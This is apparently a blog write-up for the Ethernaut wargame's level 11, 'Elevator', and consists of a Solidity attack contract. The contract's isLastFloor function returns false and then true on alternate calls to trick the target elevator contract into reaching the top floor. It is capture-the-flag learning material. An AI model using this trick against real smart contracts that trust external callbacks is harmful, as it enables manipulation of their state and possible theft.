+++
title = 'Ethernaut Level 11 - Elevator'
date = 2024-08-28T16:14:08+02:00
draft = false

featured_image =  '/images/ethernaut.png'
background_image= '/images/ethernaut.png'
summary = 'I can tell you whatever I want'
tags = [ 'writeups' , 'blockchain' ]
+++

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256 _floor) external ;
}

contract Win{
   // Implements the Building interface, but returns false and then true
    Elevator target;
    constructor(address _addr) {
        target = Elevator(_addr);
    }

    function win() public  {
        target.goTo(0);
    }

    bool current = false;
    function isLastFloor(uint256 floorNumber) public returns ( bool )  {
        bool result = current ;
        current = !current;
        return result ;
    }
}
```